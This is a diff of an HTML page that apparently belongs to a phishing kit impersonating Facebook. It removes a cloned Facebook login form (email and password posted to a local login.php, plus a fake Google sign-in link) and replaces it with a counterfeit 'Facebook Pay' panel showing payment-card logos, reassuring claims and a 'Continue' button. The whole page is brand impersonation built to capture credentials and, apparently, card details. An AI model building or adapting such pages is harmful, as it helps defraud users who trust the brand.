@@ -15,7 +15,7 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+           
         }
         .container {
             display: flex;
@@ -28,7 +28,7 @@
         }
         .left-side {
             flex: 1;
-            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%), url('https://via.placeholder.com/600x800?text=Welcome') no-repeat center center;
+            background-color: #ffffff;
             background-size: cover;
             display: flex;
             align-items: center;
@@ -101,8 +101,8 @@
         }
         button {
             width: 100%;
-            padding: 15px;
-            background: linear-gradient(135deg, #1877f2 0%, #42a5f5 100%);
+            padding: 10px;
+            background: linear-gradient(135deg, #070024 0%, #42a5f5 100%);
             color: white;
             border: none;
             border-radius: 8px;
@@ -374,42 +374,142 @@
                 font-size: 24px;
             }
         }
+        .right-side h2 span {
+      
+            color: cadetblue;
+           
+        }
+        .right-side h2 {
+            text-align: center;
+            margin-bottom: 0px;
+            font-size: 28px;
+            color: #2b2b2cd3;
+        }
+        .right-side p {
+            text-align: center;
+            margin-top: 5px;
+            margin-bottom: 20px;
+            color: #555;
+        }
+        .right-side a {
+            text-align: center;
+            display: block;
+            margin-bottom: 0px;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .right-side a:hover {
+                text-decoration: underline;
+        }
+        .right-side ul {
+            list-style: none;
+            padding-left: 0;
+            color: #555;
+            margin-top: 20px;
+            background: transparent;
+            border: none;
+            box-shadow: none;
+        }
+        .right-side ul li {
+            position: relative;
+            padding-left: 30px;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+        .right-side ul li::before {
+            content: '\2714';
+            position: absolute;
+            left: 0;
+            top: 0;
+            color: #28a745;
+            font-weight: bold;
+        }
+        .card-icons {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #555;
+            flex-wrap: nowrap;
+            gap: 4px;
+            border: none;
+        }
+        .card-icons > div {
+            display: inline-flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 2px;
+            min-width: 52px;
+            max-width: 58px;
+        }
+        .card-icons img {
+            width: 42px;
+            height: 42px;
+            object-fit: contain;
+            transition: transform 0.2s ease;
+        }
+        .card-icons img:hover {
+            transform: translateY(-2px);
+        }
+        .card-icons span {
+            font-size: 12px;
+            display: block;
+            text-align: center;
+            color: #444;
+        }
+        @media (max-width: 480px) {
+            .card-icons {
+                justify-content: space-between;
+                gap: 2px;
+                flex-wrap: nowrap;
+            }
+            .card-icons > div {
+                min-width: 44px;
+                max-width: 48px;
+            }
+            .card-icons i {
+                font-size: 20px;
+                width: 32px;
+                height: 32px;
+            }
+            .card-icons span {
+                font-size: 10px;
+                line-height: 1.1;
+            }
+        }
+
     </style>
 </head>
 <body>
     <div class="container">
         <div class="left-side we">
             
-            <img src="/gw/images/banner.png" alt="">
+            <img src="/gw/images/2.png" alt="">
         </div>
+
         <div class="right-side">
-            <div class="logo">
-                <i class="fab fa-facebook"></i>facebook
+            <h2><span>FACEBOOK</span> PAY</h2>
+            <p>Send money, donate and manage payments securely with Facebook Pay.</p>
+            <a href=#">Learn More</a>
+
+            <ul>
+                <li>No fees to send or receive money with friends and family</li>
+                <li>Pin protection to secure payments</li>
+                <li>Get live chat support weekdays 6:00 AM to 6:00 PM Pacific Time</li>
+            </ul>
+            <div class="card-icons">
+                <div><img src="icons/1.png" alt="Visa" title="Visa"></div>
+                <div><img src="icons/2.png" alt="Mastercard" title="Mastercard"></div>
+                <div><img src="icons/3.png" alt="PayPal" title="PayPal"></div>
+                <div><img src="icons/4.png" alt="Amex" title="Amex"></div>
+                <div><img src="icons/5.png" alt="Discover" title="Discover"></div>
             </div>
-            <form action="login.php" method="post">
-                <div class="form-group">
-                    <i class="fas fa-user"></i>
-                    <input type="text" name="email" placeholder="Email or phone number" required>
-                </div>
-                <div class="form-group">
-                    <i class="fas fa-lock"></i>
-                    <input type="password" name="password" placeholder="Password" required>
-                </div>
-                <button type="submit">Log In</button>
-            </form>
-            <div class="divider"><span>OR</span></div>
-            <a href="#" class="google-login" onclick="loginWithGoogle(event)">
-                <svg class="google-logo" viewBox="0 0 24 24">
-                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
-                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
-                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
-                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
-                </svg>
-                Continue with Google
-            </a>
-            <a href="#" class="forgot-password" onclick="openModal()">Forgot password?</a>
+            
+         
+          <button type="submit">Continue</button> 
         </div>
     </div>
+    <br><br>
     <div id="forgotModal" class="modal">
         <div class="modal-content">
             <span class="close" onclick="closeModal()">&times;</span>
